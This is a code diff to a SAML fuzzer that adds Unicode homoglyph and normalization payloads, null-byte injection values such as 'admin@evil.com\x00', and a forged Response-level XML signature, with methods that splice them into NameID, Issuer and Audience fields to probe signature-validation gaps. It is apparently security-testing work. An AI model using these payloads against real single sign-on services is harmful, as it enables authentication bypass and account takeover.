@@ -310,6 +310,68 @@ NS_PREFIXED_ID_ATTRS = [
 XSW_STATUSDETAIL_PREFIX = b"<samlp:StatusDetail>"
 XSW_STATUSDETAIL_SUFFIX = b"</samlp:StatusDetail>"
 
+# ── Unicode normalization payloads (H1: NEW) ─────────────────────
+# NFC→NFD decomposition: visually identical but different byte sequence.
+# Some parsers normalize on comparison, others compare raw bytes.
+# c14n does NOT mandate Unicode normalization → potential digest bypass.
+
+UNICODE_NORMALIZATION_PAIRS = [
+    # (original bytes, replacement bytes, description)
+    # NFC → NFD decomposition: é → e + combining acute
+    (b"\xc3\xa9", b"\x65\xcc\x81", b"e-acute-nfd"),
+    # NFC → NFD: ö → o + combining diaeresis
+    (b"\xc3\xb6", b"\x6f\xcc\x88", b"o-umlaut-nfd"),
+    # NFC → NFD: ñ → n + combining tilde
+    (b"\xc3\xb1", b"\x6e\xcc\x83", b"n-tilde-nfd"),
+    # Homoglyph: @ (U+0040) → ＠ (U+FF20 fullwidth)
+    (b"@", b"\xef\xbc\xa0", b"fullwidth-at"),
+    # Homoglyph: a (U+0061) → а (U+0430 Cyrillic)
+    (b"a", b"\xd0\xb0", b"cyrillic-a"),
+    # Homoglyph: e (U+0065) → е (U+0435 Cyrillic)
+    (b"e", b"\xd0\xb5", b"cyrillic-e"),
+    # Homoglyph: o (U+006F) → о (U+043E Cyrillic)
+    (b"o", b"\xd0\xbe", b"cyrillic-o"),
+    # NFKC mapping: ℀ (U+2100) → a/c
+    (b"a", b"\xe2\x84\x80", b"account-of"),
+    # Zero-width characters: insert ZWSP (U+200B) or ZWJ (U+200D)
+    (b"@", b"@\xe2\x80\x8b", b"zwsp-after-at"),
+    (b".", b".\xe2\x80\x8d", b"zwj-after-dot"),
+]
+
+# ── Null byte injection payloads (H2: NEW) ───────────────────────
+# C parsers (libxml2) may truncate at null; Java/Python preserve full string.
+
+NULL_BYTE_PAYLOADS = [
+    b"\x00",                    # raw null byte
+    b"&#0;",                    # numeric character reference (XML 1.0 illegal)
+    b"&#x0;",                   # hex character reference
+    b"\x00admin@evil.com",      # null prefix
+    b"admin@evil.com\x00",      # null suffix (C-string truncation)
+    b"admin\x00@example.com",   # null in middle
+]
+
+# ── Multi-signature payloads (H3: NEW) ───────────────────────────
+# Second signature at Response level or duplicated assertion sig.
+# Tests which signature takes precedence across implementations.
+
+FAKE_RESPONSE_SIGNATURE = (
+    b'<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
+    b"<ds:SignedInfo>"
+    b'<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
+    b'<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
+    b'<ds:Reference URI="">'
+    b"<ds:Transforms>"
+    b'<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>'
+    b'<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
+    b"</ds:Transforms>"
+    b'<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
+    b"<ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue>"
+    b"</ds:Reference>"
+    b"</ds:SignedInfo>"
+    b"<ds:SignatureValue>AAAAAAAAAAAAAAAAAAAAAA==</ds:SignatureValue>"
+    b"</ds:Signature>"
+)
+
 # ── Regex patterns for locating XML elements ─────────────────────
 
 _RE_ASSERTION_OPEN = re.compile(
@@ -516,6 +578,10 @@ class SamlMutator:
             self._reserved_ns_attr_inject,       # 52  CVE-2025-66567
             self._void_c14n_precomputed_digest,  # 53  CVE-2025-66568
             self._ns_prefixed_attr_dup,          # 54  Fragile Lock
+            # ── H: Newly discovered gap strategies ──
+            self._unicode_normalization,          # 55  NEW
+            self._null_byte_inject,               # 56  NEW
+            self._multi_sig_scope,                # 57  NEW
         ]
         self._strategy_names: list[str] = [fn.__name__.lstrip("_") for fn in self._strategies]
         self._weights: list[int] = [
@@ -537,6 +603,8 @@ class SamlMutator:
             4, 4, 4, 3, 5, 6,
             # G: CVE Gap strategies
             8, 7, 6, 7, 6,
+            # H: Newly discovered gap strategies
+            7, 6, 7,
         ]
         assert len(self._strategies) == len(self._weights)
 
@@ -1661,3 +1729,147 @@ class SamlMutator:
         return bytearray(
             bytes(data[:pos]) + attr + bytes(data[pos:])
         )
+
+    # ══════════════════════════════════════════════════════════════
+    # H: Newly Discovered Gap Strategies
+    # ══════════════════════════════════════════════════════════════
+
+    def _unicode_normalization(self, data: bytearray) -> bytearray | None:
+        """Unicode normalization confusion (H1).
+
+        Replace ASCII characters in NameID/Issuer with visually similar
+        Unicode equivalents (Cyrillic homoglyphs, fullwidth forms, NFD
+        decomposed characters, zero-width insertions).
+
+        XML C14N does NOT perform Unicode normalization, so:
+        - If parser A normalizes (NFKC) before comparison: sees "admin"
+        - If parser B compares raw bytes: sees different string
+        - Digest computation uses raw bytes → signed content preserved
+        - But identity comparison may differ across implementations
+        """
+        m = _RE_NAMEID.search(data)
+        if not m:
+            m = _RE_ISSUER.search(data)
+        if not m:
+            return None
+
+        original, replacement, _desc = self.rng.choice(UNICODE_NORMALIZATION_PAIRS)
+        text = bytes(data[m.start(2):m.end(2)])
+
+        if original not in text:
+            # Try inserting zero-width char at random position
+            if len(text) > 2:
+                zwsp = b"\xe2\x80\x8b"  # U+200B ZERO WIDTH SPACE
+                pos = self.rng.randint(1, len(text) - 1)
+                new_text = text[:pos] + zwsp + text[pos:]
+                return bytearray(
+                    bytes(data[:m.start(2)]) + new_text + bytes(data[m.end(2):])
+                )
+            return None
+
+        # Replace first occurrence only
+        new_text = text.replace(original, replacement, 1)
+        return bytearray(
+            bytes(data[:m.start(2)]) + new_text + bytes(data[m.end(2):])
+        )
+
+    def _null_byte_inject(self, data: bytearray) -> bytearray | None:
+        """Null byte injection in NameID/Issuer/Audience (H2).
+
+        C-based parsers (libxml2) may truncate strings at null bytes.
+        Java (Xerces), Python (lxml with unicode), Go treat null as
+        regular character or reject entirely.
+
+        Attack: sign "admin@evil.com\\x00user@example.com", some parsers
+        see "admin@evil.com" while others see the full string.
+        """
+        # Choose target: NameID (70%), Issuer (20%), Audience (10%)
+        roll = self.rng.random()
+        if roll < 0.7:
+            m = _RE_NAMEID.search(data)
+        elif roll < 0.9:
+            m = _RE_ISSUER.search(data)
+        else:
+            m = _RE_AUDIENCE.search(data)
+        if not m:
+            return None
+
+        text = bytes(data[m.start(2):m.end(2)])
+        payload = self.rng.choice(NULL_BYTE_PAYLOADS)
+
+        # Injection mode
+        mode = self.rng.choice(["prefix", "suffix", "middle", "replace"])
+        if mode == "prefix":
+            new_text = payload + text
+        elif mode == "suffix":
+            new_text = text + payload
+        elif mode == "middle" and len(text) > 2:
+            pos = self.rng.randint(1, len(text) - 1)
+            new_text = text[:pos] + payload + text[pos:]
+        else:
+            # Replace with evil + null + original
+            evil = self.rng.choice(EVIL_NAMEIDS)
+            new_text = evil + b"\x00" + text
+
+        return bytearray(
+            bytes(data[:m.start(2)]) + new_text + bytes(data[m.end(2):])
+        )
+
+    def _multi_sig_scope(self, data: bytearray) -> bytearray | None:
+        """Multi-signature scope confusion (H3).
+
+        Add a second ds:Signature at Response level when only an
+        assertion-level signature exists (or vice versa). Tests which
+        signature takes precedence:
+        - Some libraries validate FIRST signature found
+        - Others validate the signature closest to the signed element
+        - Some validate ALL signatures (strictest)
+        - Some validate Response-level only, ignoring assertion-level
+
+        A fake Response-level signature that fails validation may cause
+        some libraries to reject entirely, while others fall through to
+        the valid assertion-level signature.
+        """
+        # Must have existing signature
+        if b"<ds:Signature" not in data and b"<Signature" not in data:
+            return None
+
+        mode = self.rng.choice([
+            "response_sig_before",     # fake sig before assertion
+            "response_sig_after",      # fake sig after assertion
+            "duplicate_assertion_sig", # clone assertion sig
+        ])
+
+        if mode in ("response_sig_before", "response_sig_after"):
+            # Insert fake Response-level signature
+            sig = FAKE_RESPONSE_SIGNATURE
+            resp_open = _RE_RESPONSE_OPEN.search(data)
+            if not resp_open:
+                return None
+
+            if mode == "response_sig_before":
+                # Insert right after <samlp:Response ...>
+                pos = resp_open.end()
+                return bytearray(
+                    bytes(data[:pos]) + b"\n" + sig + bytes(data[pos:])
+                )
+            else:
+                # Insert before </samlp:Response>
+                resp_close = _RE_RESPONSE_CLOSE.search(data)
+                if not resp_close:
+                    return None
+                pos = resp_close.start()
+                return bytearray(
+                    bytes(data[:pos]) + sig + b"\n" + bytes(data[pos:])
+                )
+
+        else:
+            # Duplicate existing assertion-level signature
+            sig_span = _find_element_span(data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE)
+            if not sig_span:
+                return None
+            sig_block = bytes(data[sig_span[0]:sig_span[1]])
+            # Insert duplicate right after the original
+            return bytearray(
+                bytes(data[:sig_span[1]]) + b"\n" + sig_block + bytes(data[sig_span[1]:])
+            )
